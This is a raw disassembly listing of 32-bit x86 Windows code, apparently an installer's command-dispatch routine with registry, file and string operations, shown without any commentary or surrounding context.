  4024e7:	0f 84 69 07 00 00    	je     0x402c56
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	83 fe 01             	cmp    $0x1,%esi
  4024f2:	bf f0 b5 40 00       	mov    $0x40b5f0,%edi
  4024f7:	75 11                	jne    0x40250a
  4024f9:	6a 23                	push   $0x23
  4024fb:	e8 d2 08 00 00       	call   0x402dd2
  402500:	57                   	push   %edi
  402501:	e8 c2 40 00 00       	call   0x4065c8
  402506:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  40250a:	83 fe 04             	cmp    $0x4,%esi
  40250d:	75 12                	jne    0x402521
  40250f:	6a 03                	push   $0x3
  402511:	e8 9a 08 00 00       	call   0x402db0
  402516:	59                   	pop    %ecx
  402517:	a3 f0 b5 40 00       	mov    %eax,0x40b5f0
  40251c:	56                   	push   %esi
  40251d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402520:	58                   	pop    %eax
  402521:	83 fe 03             	cmp    $0x3,%esi
  402524:	75 0f                	jne    0x402535
  402526:	68 00 18 00 00       	push   $0x1800
  40252b:	57                   	push   %edi
  40252c:	53                   	push   %ebx
  40252d:	ff 75 dc             	push   -0x24(%ebp)
  402530:	e8 df 0d 00 00       	call   0x403314
  402535:	50                   	push   %eax
  402536:	57                   	push   %edi
  402537:	ff 75 f0             	push   -0x10(%ebp)
  40253a:	53                   	push   %ebx
  40253b:	ff 75 bc             	push   -0x44(%ebp)
  40253e:	ff 75 08             	push   0x8(%ebp)
  402541:	ff 15 0c 80 40 00    	call   *0x40800c
  402547:	85 c0                	test   %eax,%eax
  402549:	75 03                	jne    0x40254e
  40254b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40254e:	ff 75 08             	push   0x8(%ebp)
  402551:	e9 d3 00 00 00       	jmp    0x402629
  402556:	68 19 00 02 00       	push   $0x20019
  40255b:	e8 b2 08 00 00       	call   0x402e12
  402560:	6a 33                	push   $0x33
  402562:	8b f0                	mov    %eax,%esi
  402564:	e8 69 08 00 00       	call   0x402dd2
  402569:	3b f3                	cmp    %ebx,%esi
  40256b:	66 89 1f             	mov    %bx,(%edi)
  40256e:	0f 84 e6 03 00 00    	je     0x40295a
  402574:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402577:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40257e:	51                   	push   %ecx
  40257f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402582:	57                   	push   %edi
  402583:	51                   	push   %ecx
  402584:	53                   	push   %ebx
  402585:	50                   	push   %eax
  402586:	56                   	push   %esi
  402587:	ff 15 08 80 40 00    	call   *0x408008
  40258d:	33 c9                	xor    %ecx,%ecx
  40258f:	41                   	inc    %ecx
  402590:	85 c0                	test   %eax,%eax
  402592:	75 2e                	jne    0x4025c2
  402594:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402598:	74 13                	je     0x4025ad
  40259a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40259d:	74 06                	je     0x4025a5
  40259f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4025a3:	75 1d                	jne    0x4025c2
  4025a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4025a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ab:	eb 74                	jmp    0x402621
  4025ad:	ff 37                	push   (%edi)
  4025af:	33 c0                	xor    %eax,%eax
  4025b1:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025b4:	57                   	push   %edi
  4025b5:	0f 94 c0             	sete   %al
  4025b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025bb:	e8 39 3f 00 00       	call   0x4064f9
  4025c0:	eb 66                	jmp    0x402628
  4025c2:	66 89 1f             	mov    %bx,(%edi)
  4025c5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025c8:	eb 5e                	jmp    0x402628
  4025ca:	68 19 00 02 00       	push   $0x20019
  4025cf:	e8 3e 08 00 00       	call   0x402e12
  4025d4:	6a 03                	push   $0x3
  4025d6:	8b f0                	mov    %eax,%esi
  4025d8:	e8 d3 07 00 00       	call   0x402db0
  4025dd:	3b f3                	cmp    %ebx,%esi
  4025df:	59                   	pop    %ecx
  4025e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025e3:	66 89 1f             	mov    %bx,(%edi)
  4025e6:	0f 84 6e 03 00 00    	je     0x40295a
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025f7:	74 0c                	je     0x402605
  4025f9:	51                   	push   %ecx
  4025fa:	57                   	push   %edi
  4025fb:	50                   	push   %eax
  4025fc:	56                   	push   %esi
  4025fd:	ff 15 04 80 40 00    	call   *0x408004
  402603:	eb 1c                	jmp    0x402621
  402605:	53                   	push   %ebx
  402606:	53                   	push   %ebx
  402607:	53                   	push   %ebx
  402608:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40260b:	53                   	push   %ebx
  40260c:	51                   	push   %ecx
  40260d:	57                   	push   %edi
  40260e:	50                   	push   %eax
  40260f:	56                   	push   %esi
  402610:	ff 15 00 80 40 00    	call   *0x408000
  402616:	85 c0                	test   %eax,%eax
  402618:	74 07                	je     0x402621
  40261a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402621:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402628:	56                   	push   %esi
  402629:	ff 15 10 80 40 00    	call   *0x408010
  40262f:	e9 22 06 00 00       	jmp    0x402c56
  402634:	57                   	push   %edi
  402635:	e8 d8 3e 00 00       	call   0x406512
  40263a:	3b c3                	cmp    %ebx,%eax
  40263c:	0f 84 14 06 00 00    	je     0x402c56
  402642:	50                   	push   %eax
  402643:	e9 cf f9 ff ff       	jmp    0x402017
  402648:	6a ed                	push   $0xffffffed
  40264a:	e8 83 07 00 00       	call   0x402dd2
  40264f:	ff 75 d8             	push   -0x28(%ebp)
  402652:	ff 75 d4             	push   -0x2c(%ebp)
  402655:	50                   	push   %eax
  402656:	e8 47 3a 00 00       	call   0x4060a2
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 f3 02 00 00    	je     0x402957
  402664:	50                   	push   %eax
  402665:	e9 28 ef ff ff       	jmp    0x401592
  40266a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40266d:	33 c9                	xor    %ecx,%ecx
  40266f:	83 fa 38             	cmp    $0x38,%edx
  402672:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402675:	0f 94 c1             	sete   %cl
  402678:	3b c3                	cmp    %ebx,%eax
  40267a:	8b f1                	mov    %ecx,%esi
  40267c:	74 1b                	je     0x402699
  40267e:	6a 01                	push   $0x1
  402680:	e8 2b 07 00 00       	call   0x402db0
  402685:	66 a3 f0 ad 40 00    	mov    %ax,0x40adf0
  40268b:	33 c0                	xor    %eax,%eax
  40268d:	3b f3                	cmp    %ebx,%esi
  40268f:	59                   	pop    %ecx
  402690:	0f 94 c0             	sete   %al
  402693:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402696:	40                   	inc    %eax
  402697:	eb 3f                	jmp    0x4026d8
  402699:	83 fa 38             	cmp    $0x38,%edx
  40269c:	75 2b                	jne    0x4026c9
  40269e:	6a 21                	push   $0x21
  4026a0:	e8 2d 07 00 00       	call   0x402dd2
  4026a5:	68 00 04 00 00       	push   $0x400
  4026aa:	68 f0 ad 40 00       	push   $0x40adf0
  4026af:	68 f0 b5 40 00       	push   $0x40b5f0
  4026b4:	e8 1b 3f 00 00       	call   0x4065d4
  4026b9:	83 c4 0c             	add    $0xc,%esp
  4026bc:	68 f0 ad 40 00       	push   $0x40adf0
  4026c1:	ff 15 28 81 40 00    	call   *0x408128
  4026c7:	eb 0f                	jmp    0x4026d8
  4026c9:	6a 11                	push   $0x11
  4026cb:	e8 02 07 00 00       	call   0x402dd2
  4026d0:	50                   	push   %eax
  4026d1:	e8 f2 3e 00 00       	call   0x4065c8
  4026d6:	03 c0                	add    %eax,%eax
  4026d8:	66 39 1f             	cmp    %bx,(%edi)
  4026db:	89 45 08             	mov    %eax,0x8(%ebp)
  4026de:	0f 84 76 02 00 00    	je     0x40295a
  4026e4:	57                   	push   %edi
  4026e5:	e8 28 3e 00 00       	call   0x406512
  4026ea:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026ed:	8b f8                	mov    %eax,%edi
  4026ef:	75 14                	jne    0x402705
  4026f1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026f4:	74 0f                	je     0x402705
  4026f6:	57                   	push   %edi
  4026f7:	57                   	push   %edi
  4026f8:	e8 86 3a 00 00       	call   0x406183
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	0f 8c 55 02 00 00    	jl     0x40295a
  402705:	ff 75 08             	push   0x8(%ebp)
  402708:	68 f0 ad 40 00       	push   $0x40adf0
  40270d:	57                   	push   %edi
  40270e:	e8 41 3a 00 00       	call   0x406154
  402713:	e9 c1 ee ff ff       	jmp    0x4015d9
  402718:	6a 02                	push   $0x2
  40271a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40271d:	58                   	pop    %eax
  40271e:	50                   	push   %eax
  40271f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402722:	e8 89 06 00 00       	call   0x402db0
  402727:	83 f8 01             	cmp    $0x1,%eax
  40272a:	59                   	pop    %ecx
  40272b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40272e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402731:	0f 8c 1f 05 00 00    	jl     0x402c56
  402737:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40273c:	3b c1                	cmp    %ecx,%eax
  40273e:	7e 03                	jle    0x402743
  402740:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402743:	66 39 1f             	cmp    %bx,(%edi)
  402746:	0f 84 5e 01 00 00    	je     0x4028aa
  40274c:	57                   	push   %edi
  40274d:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402750:	e8 bd 3d 00 00       	call   0x406512
  402755:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402758:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40275b:	0f 8e 49 01 00 00    	jle    0x4028aa
  402761:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402767:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  40276b:	0f 85 8f 00 00 00    	jne    0x402800
  402771:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	6a 02                	push   $0x2
  402778:	58                   	pop    %eax
  402779:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40277c:	50                   	push   %eax
  40277d:	8d 45 0a             	lea    0xa(%ebp),%eax
  402780:	50                   	push   %eax
  402781:	ff 75 e8             	push   -0x18(%ebp)
  402784:	ff 15 30 81 40 00    	call   *0x408130
  40278a:	85 c0                	test   %eax,%eax
  40278c:	0f 84 18 01 00 00    	je     0x4028aa
  402792:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402795:	3b cb                	cmp    %ebx,%ecx
  402797:	0f 84 0d 01 00 00    	je     0x4028aa
  40279d:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4027a2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027a5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ab:	0f 85 b5 00 00 00    	jne    0x402866
  4027b1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b4:	6a 01                	push   $0x1
  4027b6:	50                   	push   %eax
  4027b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ba:	51                   	push   %ecx
  4027bb:	50                   	push   %eax
  4027bc:	6a 08                	push   $0x8
  4027be:	53                   	push   %ebx
  4027bf:	ff d6                	call   *%esi
  4027c1:	85 c0                	test   %eax,%eax
  4027c3:	75 68                	jne    0x40282d
  4027c5:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027c8:	f7 df                	neg    %edi
  4027ca:	ff 4d c0             	decl   -0x40(%ebp)
  4027cd:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027d2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027d5:	74 59                	je     0x402830
  4027d7:	ff 4d b4             	decl   -0x4c(%ebp)
  4027da:	47                   	inc    %edi
  4027db:	6a 01                	push   $0x1
  4027dd:	53                   	push   %ebx
  4027de:	57                   	push   %edi
  4027df:	ff 75 e8             	push   -0x18(%ebp)
  4027e2:	ff 15 34 81 40 00    	call   *0x408134
  4027e8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027eb:	6a 01                	push   $0x1
  4027ed:	50                   	push   %eax
  4027ee:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027f1:	ff 75 c0             	push   -0x40(%ebp)
  4027f4:	50                   	push   %eax
  4027f5:	6a 08                	push   $0x8
  4027f7:	53                   	push   %ebx
  4027f8:	ff d6                	call   *%esi
  4027fa:	85 c0                	test   %eax,%eax
  4027fc:	74 cc                	je     0x4027ca
  4027fe:	eb 2d                	jmp    0x40282d
  402800:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402803:	75 16                	jne    0x40281b
  402805:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402808:	75 11                	jne    0x40281b
  40280a:	53                   	push   %ebx
  40280b:	ff 75 e8             	push   -0x18(%ebp)
  40280e:	e8 70 39 00 00       	call   0x406183
  402813:	85 c0                	test   %eax,%eax
  402815:	0f 8c 8f 00 00 00    	jl     0x4028aa
  40281b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40281e:	6a 02                	push   $0x2
  402820:	50                   	push   %eax
  402821:	ff 75 e8             	push   -0x18(%ebp)
  402824:	e8 fc 38 00 00       	call   0x406125
  402829:	85 c0                	test   %eax,%eax
  40282b:	74 7d                	je     0x4028aa
  40282d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402830:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402833:	75 31                	jne    0x402866
  402835:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  40283a:	74 3b                	je     0x402877
  40283c:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  402841:	74 34                	je     0x402877
  402843:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402846:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402849:	ff 45 f8             	incl   -0x8(%ebp)
  40284c:	66 3b c3             	cmp    %bx,%ax
  40284f:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402853:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402856:	74 52                	je     0x4028aa
  402858:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40285b:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40285e:	0f 8c 03 ff ff ff    	jl     0x402767
  402864:	eb 44                	jmp    0x4028aa
  402866:	0f b7 c0             	movzwl %ax,%eax
  402869:	50                   	push   %eax
  40286a:	ff 75 f4             	push   -0xc(%ebp)
  40286d:	e8 87 3c 00 00       	call   0x4064f9
  402872:	e9 e8 03 00 00       	jmp    0x402c5f
  402877:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  40287b:	74 1b                	je     0x402898
  40287d:	66 3d 0d 00          	cmp    $0xd,%ax
  402881:	74 06                	je     0x402889
  402883:	66 3d 0a 00          	cmp    $0xa,%ax
  402887:	75 0f                	jne    0x402898
  402889:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40288c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40288f:	ff 45 f8             	incl   -0x8(%ebp)
  402892:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402896:	eb 12                	jmp    0x4028aa
  402898:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40289b:	6a 01                	push   $0x1
  40289d:	f7 d8                	neg    %eax
  40289f:	53                   	push   %ebx
  4028a0:	50                   	push   %eax
  4028a1:	ff 75 e8             	push   -0x18(%ebp)
  4028a4:	ff 15 34 81 40 00    	call   *0x408134
  4028aa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4028b0:	3b c3                	cmp    %ebx,%eax
  4028b2:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4028b6:	e9 20 ed ff ff       	jmp    0x4015db
  4028bb:	66 39 1f             	cmp    %bx,(%edi)
  4028be:	0f 84 92 03 00 00    	je     0x402c56
  4028c4:	6a 02                	push   $0x2
  4028c6:	e8 e5 04 00 00       	call   0x402db0
  4028cb:	59                   	pop    %ecx
  4028cc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028cf:	ff 75 dc             	push   -0x24(%ebp)
  4028d2:	53                   	push   %ebx
  4028d3:	50                   	push   %eax
  4028d4:	57                   	push   %edi
  4028d5:	e8 38 3c 00 00       	call   0x406512
  4028da:	50                   	push   %eax
  4028db:	ff 15 34 81 40 00    	call   *0x408134
  4028e1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028e4:	0f 8c 6c 03 00 00    	jl     0x402c56
  4028ea:	50                   	push   %eax
  4028eb:	e9 dd 02 00 00       	jmp    0x402bcd
  4028f0:	57                   	push   %edi
  4028f1:	e8 1c 3c 00 00       	call   0x406512
  4028f6:	3b c3                	cmp    %ebx,%eax
  4028f8:	0f 84 58 03 00 00    	je     0x402c56
  4028fe:	50                   	push   %eax
  4028ff:	ff 15 38 81 40 00    	call   *0x408138
  402905:	e9 4c 03 00 00       	jmp    0x402c56
  40290a:	ff 75 f4             	push   -0xc(%ebp)
  40290d:	e8 00 3c 00 00       	call   0x406512
  402912:	3b c3                	cmp    %ebx,%eax
  402914:	74 12                	je     0x402928
  402916:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291c:	51                   	push   %ecx
  40291d:	50                   	push   %eax
  40291e:	ff 15 3c 81 40 00    	call   *0x40813c
  402924:	85 c0                	test   %eax,%eax
  402926:	75 47                	jne    0x40296f
  402928:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292f:	66 89 1f             	mov    %bx,(%edi)
  402932:	e9 1f 03 00 00       	jmp    0x402c56
  402937:	6a 02                	push   $0x2
  402939:	e8 94 04 00 00       	call   0x402dd2
  40293e:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  402944:	51                   	push   %ecx
  402945:	50                   	push   %eax
  402946:	ff 15 40 81 40 00    	call   *0x408140
  40294c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40294f:	75 15                	jne    0x402966
  402951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402954:	66 89 18             	mov    %bx,(%eax)
  402957:	66 89 1f             	mov    %bx,(%edi)
  40295a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402961:	e9 f0 02 00 00       	jmp    0x402c56
  402966:	50                   	push   %eax
  402967:	ff 75 f4             	push   -0xc(%ebp)
  40296a:	e8 8a 3b 00 00       	call   0x4064f9
  40296f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402975:	50                   	push   %eax
  402976:	57                   	push   %edi
  402977:	e9 44 01 00 00       	jmp    0x402ac0
  40297c:	6a f0                	push   $0xfffffff0
  40297e:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  402983:	e8 4a 04 00 00       	call   0x402dd2
  402988:	8b f0                	mov    %eax,%esi
  40298a:	56                   	push   %esi
  40298b:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40298e:	e8 65 35 00 00       	call   0x405ef8
  402993:	85 c0                	test   %eax,%eax
  402995:	75 07                	jne    0x40299e
  402997:	6a ed                	push   $0xffffffed
  402999:	e8 34 04 00 00       	call   0x402dd2
  40299e:	56                   	push   %esi
  40299f:	e8 d9 36 00 00       	call   0x40607d
  4029a4:	6a 02                	push   $0x2
  4029a6:	68 00 00 00 40       	push   $0x40000000
  4029ab:	56                   	push   %esi
  4029ac:	e8 f1 36 00 00       	call   0x4060a2
  4029b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4029b7:	0f 84 aa 00 00 00    	je     0x402a67
  4029bd:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4029c0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4029c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4029c6:	0f 84 83 00 00 00    	je     0x402a4f
  4029cc:	a1 14 47 43 00       	mov    0x434714,%eax
  4029d1:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029d7:	50                   	push   %eax
  4029d8:	6a 40                	push   $0x40
  4029da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029dd:	ff d6                	call   *%esi
  4029df:	8b f8                	mov    %eax,%edi
  4029e1:	3b fb                	cmp    %ebx,%edi
  4029e3:	74 6a                	je     0x402a4f
  4029e5:	53                   	push   %ebx
  4029e6:	e8 5a 0b 00 00       	call   0x403545
  4029eb:	ff 75 bc             	push   -0x44(%ebp)
  4029ee:	57                   	push   %edi
  4029ef:	e8 3b 0b 00 00       	call   0x40352f
  4029f4:	ff 75 d8             	push   -0x28(%ebp)
  4029f7:	6a 40                	push   $0x40
  4029f9:	ff d6                	call   *%esi
  4029fb:	8b f0                	mov    %eax,%esi
  4029fd:	3b f3                	cmp    %ebx,%esi
  4029ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402a02:	74 34                	je     0x402a38
  402a04:	ff 75 d8             	push   -0x28(%ebp)
  402a07:	56                   	push   %esi
  402a08:	53                   	push   %ebx
  402a09:	ff 75 d4             	push   -0x2c(%ebp)
  402a0c:	e8 03 09 00 00       	call   0x403314
  402a11:	eb 18                	jmp    0x402a2b
  402a13:	8b 0e                	mov    (%esi),%ecx
  402a15:	8b 46 04             	mov    0x4(%esi),%eax
  402a18:	83 c6 08             	add    $0x8,%esi
  402a1b:	51                   	push   %ecx
  402a1c:	03 c7                	add    %edi,%eax
  402a1e:	56                   	push   %esi
  402a1f:	50                   	push   %eax
  402a20:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402a23:	e8 35 36 00 00       	call   0x40605d
  402a28:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a2b:	38 1e                	cmp    %bl,(%esi)
  402a2d:	75 e4                	jne    0x402a13
  402a2f:	ff 75 f0             	push   -0x10(%ebp)
  402a32:	ff 15 0c 81 40 00    	call   *0x40810c
  402a38:	ff 75 bc             	push   -0x44(%ebp)
  402a3b:	57                   	push   %edi
  402a3c:	ff 75 08             	push   0x8(%ebp)
  402a3f:	e8 10 37 00 00       	call   0x406154
  402a44:	57                   	push   %edi
  402a45:	ff 15 0c 81 40 00    	call   *0x40810c
  402a4b:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 08             	push   0x8(%ebp)
  402a54:	ff 75 c8             	push   -0x38(%ebp)
  402a57:	e8 b8 08 00 00       	call   0x403314
  402a5c:	ff 75 08             	push   0x8(%ebp)
  402a5f:	8b f8                	mov    %eax,%edi
  402a61:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a67:	6a f3                	push   $0xfffffff3
  402a69:	3b fb                	cmp    %ebx,%edi
  402a6b:	5e                   	pop    %esi
  402a6c:	7d 13                	jge    0x402a81
  402a6e:	6a ef                	push   $0xffffffef
  402a70:	5e                   	pop    %esi
  402a71:	ff 75 c0             	push   -0x40(%ebp)
  402a74:	ff 15 44 81 40 00    	call   *0x408144
  402a7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a81:	56                   	push   %esi
  402a82:	e9 96 f8 ff ff       	jmp    0x40231d
  402a87:	53                   	push   %ebx
  402a88:	e8 23 03 00 00       	call   0x402db0
  402a8d:	8b f8                	mov    %eax,%edi
  402a8f:	59                   	pop    %ecx
  402a90:	3b 3d 2c 47 43 00    	cmp    0x43472c,%edi
  402a96:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a99:	0f 83 bb fe ff ff    	jae    0x40295a
  402a9f:	8b f7                	mov    %edi,%esi
  402aa1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aa4:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402aaa:	03 35 28 47 43 00    	add    0x434728,%esi
  402ab0:	3b c3                	cmp    %ebx,%eax
  402ab2:	7c 1c                	jl     0x402ad0
  402ab4:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402ab7:	75 11                	jne    0x402aca
  402ab9:	83 c6 18             	add    $0x18,%esi
  402abc:	56                   	push   %esi
  402abd:	ff 75 f4             	push   -0xc(%ebp)
  402ac0:	e8 ed 3a 00 00       	call   0x4065b2
  402ac5:	e9 8c 01 00 00       	jmp    0x402c56
  402aca:	51                   	push   %ecx
  402acb:	e9 fd 00 00 00       	jmp    0x402bcd
  402ad0:	83 c9 ff             	or     $0xffffffff,%ecx
  402ad3:	2b c8                	sub    %eax,%ecx
  402ad5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ad8:	74 10                	je     0x402aea
  402ada:	6a 01                	push   $0x1
  402adc:	e8 cf 02 00 00       	call   0x402db0
  402ae1:	59                   	pop    %ecx
  402ae2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ae5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ae8:	eb 10                	jmp    0x402afa
  402aea:	ff 75 e0             	push   -0x20(%ebp)
  402aed:	8d 46 18             	lea    0x18(%esi),%eax
  402af0:	50                   	push   %eax
  402af1:	e8 f9 3a 00 00       	call   0x4065ef
  402af6:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402afa:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402afd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b00:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	0f 84 4a 01 00 00    	je     0x402c56
  402b0c:	57                   	push   %edi
  402b0d:	e8 6b e6 ff ff       	call   0x40117d
  402b12:	e9 3f 01 00 00       	jmp    0x402c56
  402b17:	53                   	push   %ebx
  402b18:	e8 93 02 00 00       	call   0x402db0
  402b1d:	83 f8 20             	cmp    $0x20,%eax
  402b20:	59                   	pop    %ecx
  402b21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b24:	0f 83 30 fe ff ff    	jae    0x40295a
  402b2a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b2d:	74 22                	je     0x402b51
  402b2f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b32:	74 12                	je     0x402b46
  402b34:	50                   	push   %eax
  402b35:	e8 5f e7 ff ff       	call   0x401299
  402b3a:	53                   	push   %ebx
  402b3b:	53                   	push   %ebx
  402b3c:	e8 ae e6 ff ff       	call   0x4011ef
  402b41:	e9 10 01 00 00       	jmp    0x402c56
  402b46:	53                   	push   %ebx
  402b47:	e8 96 e7 ff ff       	call   0x4012e2
  402b4c:	e9 99 fd ff ff       	jmp    0x4028ea
  402b51:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b54:	74 15                	je     0x402b6b
  402b56:	8b 15 10 47 43 00    	mov    0x434710,%edx
  402b5c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b5f:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b66:	e9 eb 00 00 00       	jmp    0x402c56
  402b6b:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  402b71:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b78:	ff 75 f4             	push   -0xc(%ebp)
  402b7b:	e8 6f 3a 00 00       	call   0x4065ef
  402b80:	e9 d1 00 00 00       	jmp    0x402c56
  402b85:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b88:	2b c3                	sub    %ebx,%eax
  402b8a:	74 4b                	je     0x402bd7
  402b8c:	48                   	dec    %eax
  402b8d:	0f 85 c3 00 00 00    	jne    0x402c56
  402b93:	6a 02                	push   $0x2
  402b95:	e8 16 02 00 00       	call   0x402db0
  402b9a:	6a 04                	push   $0x4
  402b9c:	8b f0                	mov    %eax,%esi
  402b9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ba1:	e8 0a 02 00 00       	call   0x402db0
  402ba6:	59                   	pop    %ecx
  402ba7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402baa:	59                   	pop    %ecx
  402bab:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402bae:	0f b6 c8             	movzbl %al,%ecx
  402bb1:	c1 e8 18             	shr    $0x18,%eax
  402bb4:	3b f3                	cmp    %ebx,%esi
  402bb6:	75 05                	jne    0x402bbd
  402bb8:	be 80 47 43 00       	mov    $0x434780,%esi
  402bbd:	03 c6                	add    %esi,%eax
  402bbf:	51                   	push   %ecx
  402bc0:	50                   	push   %eax
  402bc1:	8d 45 08             	lea    0x8(%ebp),%eax
  402bc4:	50                   	push   %eax
  402bc5:	e8 93 34 00 00       	call   0x40605d
  402bca:	ff 75 08             	push   0x8(%ebp)
  402bcd:	ff 75 f4             	push   -0xc(%ebp)
  402bd0:	e8 24 39 00 00       	call   0x4064f9
  402bd5:	eb 7f                	jmp    0x402c56
  402bd7:	6a 05                	push   $0x5
  402bd9:	e8 c8 3d 00 00       	call   0x4069a6
  402bde:	6a 22                	push   $0x22
